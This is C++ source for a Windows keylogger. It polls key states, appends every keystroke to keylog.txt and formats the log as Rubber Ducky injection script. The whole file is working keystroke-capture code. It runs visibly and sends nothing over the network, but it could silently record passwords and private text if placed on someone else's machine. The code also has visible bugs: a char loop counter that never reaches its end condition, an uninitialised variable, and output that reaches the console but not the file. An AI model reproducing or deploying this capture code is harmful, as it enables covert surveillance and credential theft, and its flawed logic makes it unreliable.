#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>

//logs key inputs, formats it into rubby ducky language and saves it to a file

using namespace std;

int Save(string file);

int main() {
    string file = "keylog.txt"; //file to save the keylog to (must use .c_str() to conver to char*)
    //capital letters A-Z
    int hexKey[] = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A};

    cout << "- - - Press ALT to start keylogger - - -" << endl;
    cout << "Keylogger started, will be saved to " << file << endl;
    Save(file); //main function which saves to file 
    cout << endl << "Keylogger finished, key strokes save in " << file << endl; 

}

int Save(string file){
    ofstream fout;


    char i;
    char prevkey = 0;
    bool bisString = false;
    int isString = 0;
    //end by pressing ESC key
    while(i != 27) 
    { 
        prevkey = 0; //reset previous key
        Sleep(100); //sleep for 100ms to prevent high CPU usage
        
        for(i = 8; i <= 255; i++) 
        {
            //use standard windows api function to (only pressed keys)
            if(GetAsyncKeyState(i) == -32767) 
            {
                //ios::out is used to create a file, if it already exists it will be overwritten
                //ios::app is used to append to file, cannot edit original contents

                fout.open(file.c_str(), ios::app);
                if(!fout) 
                {
                    cout << "Error opening file" << endl;
                    return 1; //exit if file cannot be opened
                }
                if(GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(0x31) & 0x8000)
                    {
                        if(isString%2 == 0){
                            //starts a string command in ducky language
                            bisString = true;
                            fout << "STRING ";
                            cout << "STRING ";
                        }
                        else {
                            //ends a string command in duckky language
                            bisString = false;
                            cout << endl;
                            cout << "DELAY 3000" << endl;
                        }
                    isString++;
                    }


                if((i >= 8 && i <= 222) && i != prevkey) 
                {
                    //check if multiple keys are pressed at the same time
                    if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(0x41) & 0x8000) {
                        //check if shift key is pressed
                        cout << "SHIFT A";
                        fout << "SHIFT A";
                    } 
                    else if(GetAsyncKeyState(VK_LMENU) || GetAsyncKeyState(VK_RMENU)) {
                        //check if alt key is pressed
                        cout << "ALT "; //special character
                        fout<< "ALT "; //special character
                    } else {
                    
                    
                    switch(i) 
                    {
                        case VK_BACK: fout << " BACKSPACE"; cout << "BACKSPACE "; break;
                        case VK_TAB: fout << "\t"; cout << "\t"; break;
                        case VK_RETURN: fout << "ENTER"; cout << "ENTER "; break;
                        case VK_SHIFT: fout << "SHIFT"; cout << "SHIFT "; break;
                        case VK_CONTROL: fout << "CTRL"; cout << "CTRL "; break;
                        case VK_MENU: fout << "ALT"; cout << "ALT "; break;
                        //case VK_CAPITAL: fout << "CAPSLOCK"; cout << "CAPSLOCK"; break;
                        case VK_ESCAPE: fout << "ESCAPE"; cout << "ESCAPE "; break;
                        case VK_SPACE: 
                        if(!bisString){
                        fout << "SPACE"; cout << "SPACE "; break;
                        }
                        default:
                        //for strings
                            if(i >= 65 && i <= 90) {
                                if(!(GetAsyncKeyState(VK_SHIFT) & 0x8000) && ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)) {
                                    fout << char(i + 32);
                                    cout << char(i + 32);
                                } else {
                                    fout << char(i);
                                    cout << char(i);
                                }
                            } else {
                                if(i == VK_SPACE){
                                    fout << " "; cout << " "; break;
                                }
                                else if(i == VK_TAB){
                                    fout << "\t"; cout << "\t"; break;
                                } else{
                                fout << char(i);
                                cout << char(i);
                                }
                                break;
                            }
                            break;
                    }

                    if (i == 27)
                        break; //exit loop if ESC key is pressed

                    prevkey = i; //store previous key

                    }
                }
                else 
                {
                    cout << " . . . " ; //DEBUG KEYS
                }
                if(!bisString){
                    fout << endl;
                    cout << endl;
                }

                fout.close();
            }
            
        }
        
    }
    return 0;
}